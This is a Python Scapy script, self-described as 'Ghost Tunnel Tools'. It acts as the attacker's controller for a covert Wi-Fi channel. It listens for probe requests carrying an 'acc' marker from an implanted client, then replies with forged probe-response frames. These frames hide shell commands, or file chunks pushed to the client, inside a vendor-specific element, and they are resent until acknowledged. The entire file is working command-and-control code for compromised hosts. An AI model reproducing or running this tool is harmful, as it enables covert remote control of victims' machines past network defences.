#!usr/bin/python
#coding=utf-8
import sys, getopt
from scapy.all import *
import binascii
import time
import shutil
#need modify /usr/lib/python2.7/dist-packages/scapy  252,262

class Tools:
    netSSID = 'ghost'       #Network name
    @staticmethod
    def getPayloadFrame(cmd, ct_addr2, addr2):
        payload = Dot11Elt(ID=221, info=(cmd))
        response_dot11 = Dot11(subtype=5, addr1=ct_addr2,addr2=addr2, addr3=addr2,SC=22222)
        return RadioTap()/response_dot11/Dot11ProbeResp()/payload/Dot11Elt(ID='SSID', info=Tools.netSSID)
    @staticmethod
    def getTimeHash():
        hash_time = str(hash(time.time()))[0:8]
        return hash_time
    @staticmethod
    def CMDEncode(cmd):
        cmd_bin = ""
        for i in cmd:
            cmd_bin += binascii.a2b_hex(hex(ord(i))[2:4])
        cmd_bin += '\0'
        return cmd_bin
    @staticmethod
    def fileEncode(cmd,fileContext):
        cmd_bin = ""
        for i in cmd:
            cmd_bin += binascii.a2b_hex(hex(ord(i))[2:4])
        for i in fileContext:
            cmd_bin += i
        cmd_bin += '\0'
        return cmd_bin
    @staticmethod
    def int2hex(cmd):
        temp = "0"
        temp += str(hex(cmd))[2:]
        return temp[-2:]
        
class Action1:
    def __init__(self):
        self.ReceiveHash = None;
        self.SendHash = None;
        self.number = 0;
	self.time = 0;
    def Handle(self,packet):
        dot = packet.getlayer(Dot11)
        if dot != None and dot.type == 0 and dot.subtype == 4:
            data = str(packet)
            index = data.find("acc")
            if  index>= 0:
                print("Get Frame!(0-11): " + data[index:index+11])
                self.ReceiveHash = data[index+3:index+11]
                ct_addr2 = packet.addr2
                if(self.SendHash != self.ReceiveHash ):
		    if(time.time() - self.time > timeInterval ):
                        self.number += 1
                        if(self.SendHash == None):
                            self.SendHash = Tools.getTimeHash()
                        cmd_bin = Tools().CMDEncode("ccc"+self.SendHash+SendCMD)
                        print("Round ["+str(self.number)+"]  : Context is {"+cmd_bin+"}   "),
                        response_frame = Tools.getPayloadFrame(cmd_bin, ct_addr2, '22:22:22:22:22:22')
                        sendp(response_frame, iface="wlan0", count=PackageCount + 50 * self.number)
                        self.time = time.time()
		else:
                    self.SendHash = None;
                    self.number = 0;
                    print("=====Attack OK!!!======")
                    exit(1);


class Action2:
    def __init__(self):
        self.filename = None
        self.filebuf = []
        self.filelen = 0
        self.CurrentIndex = 0
        self.ReceiveHash = None
        self.SendHash = None
        self.number = 0
	self.time = 0
    def setfilename(self,name):
        self.filename = name
    def slicingFile(self,CMDdir):
	file_object = open(CMDdir)
	try:
    	    while True:
                chunk = file_object.read(220)
                if not chunk:
                    break
                self.filebuf.append(chunk)
        finally:
            file_object.close( )
            self.filelen = len(self.filebuf)
    def Handle(self,packet):
        dot = packet.getlayer(Dot11)
        if dot != None and dot.type == 0 and dot.subtype == 4:
            data = str(packet)
            index = data.find("acc")
            if  index>= 0:
                print("Get Frame!(0-11): " + data[index:index+11])
                self.ReceiveHash = data[index+3:index+11]
                ct_addr2 = packet.addr2
                if(self.SendHash != self.ReceiveHash ):
		    if(time.time() - self.time > timeInterval ):
                        self.number += 1
                        if(self.SendHash == None):
                            self.SendHash = Tools.getTimeHash()
                        cmd_bin = Tools.fileEncode("F"+Tools.int2hex(len(self.filename))+self.SendHash+Tools.int2hex(self.filelen)+Tools.int2hex(self.CurrentIndex+1)+self.filename , self.filebuf[self.CurrentIndex])

                        print("Round ["+str(self.CurrentIndex+1)+"/"+str(self.filelen)+" - "+str(self.number)+"] , "+str(len(self.filebuf[self.CurrentIndex]))+" bytes ,"),
                        response_frame = Tools.getPayloadFrame(cmd_bin, ct_addr2, '22:22:22:22:22:22')
                        sendp(response_frame, iface="wlan0", count=PackageCount + 50 * self.number)
                        self.time = time.time()
		else:
                    self.SendHash = None
                    self.number = 0
                    self.CurrentIndex += 1
                    if(self.CurrentIndex >= self.filelen):
                        print("=====Attack OK!!!======")
                        exit(1);
            


SendCMD = ""  #Command Mode is COMMAND, File Mode is FILE PATH
PackageCount = 450 #Send frame amount firstly
timeInterval = 4 # unit: second
AttackMode = None

opts, args = getopt.getopt(sys.argv[1:], "hc:f:p:t:")
for op, value in opts:
    if op in ("-c"):
        act1 = Action1()
        #-------get Command--------
        SendCMD += value
        for j in args:
            SendCMD = SendCMD+" "+j
        #-------- param Analysis FINISH ! --------
        AttackMode = "Command"
        print("You input command is :[" + SendCMD+"]")

    elif op in ("-f"):
        act2 = Action2()
        #-------get send file path--------
        SendCMD = value
        CMD2fileName = SendCMD.split("/")[-1]
        if(len(CMD2fileName) <= 15):
            act2.setfilename(CMD2fileName)
        else:
            print("filename so long!")
            exit(1)
	#--------translate from \n to \r\n && slice file--------
        with open(SendCMD) as f:
            lines = f.readlines() 
        with open(SendCMD+"_tmp","w") as f_w:
            for line in lines:
                if "\n" in line:
                    line = line.replace("\n","\r\n")
                f_w.write(line)
        act2.slicingFile(SendCMD+"_tmp")
        os.remove(SendCMD+"_tmp")
        #-------get the number of send frame firstly -------
        args_tmp = ""
        for j in args:
            args_tmp = args_tmp+" "+j
        try:
            sendCount = int(args_tmp.split(" ")[1])
        except:
            sendCount = 1
        if(sendCount <= act2.filelen):
            act2.CurrentIndex = sendCount-1
        else:
            print("[ERROR] SendCount > file len")
            exit(1)
        #-------- param Analysis FINISH ! --------
        AttackMode = "File"
        print("input file is :[" + SendCMD+"] , the number of send frame firstly is :["+str(sendCount)+"]")

    elif op in ("-p"):
        #-------- get the number of Send Package --------
        args_tmp = value
        try:
            PackageCount = int(args_tmp.split(" ")[0]) - 50
        except:
            PackageCount = 450    
        #-------- param Analysis FINISH ! --------  
        if(PackageCount < 0):
            print("[ERROR] the min of PackageCount is 50 !!")
            PackageCount = 450
	else:
            print("The value of the send package firstly is :" + str(PackageCount+50) )

    elif op in ("-t"):
        #-------- get the Interval time --------
        args_tmp = value
        try:
            timeInterval = float(args_tmp.split(" ")[0])
        except:
            timeInterval = 4  
        #-------- param Analysis FINISH ! --------  
        if(timeInterval < 0):
            print("[ERROR] the min of Interval time is 0 !!")
            timeInterval = 4
	else:
            print("The Interval time is :" + str(timeInterval) )

    elif op in ("-h"):
        print('''
        ----------------------------------
           Ghost Tunnel Tools Manual...
        ----------------------------------
        -h
        -c
        -f
        [-t]  unit:Second
        [-p]
        ''')
       
print("=====Attack Begin======")
print("Sniff Monitor...")
try:
    if(AttackMode == "Command"):
        sniff(iface="wlan0", prn=act1.Handle)
    elif(AttackMode == "File"):
        sniff(iface="wlan0", prn=act2.Handle)        
except Exception as e:
    print("[ERROR]:"+str(e))   
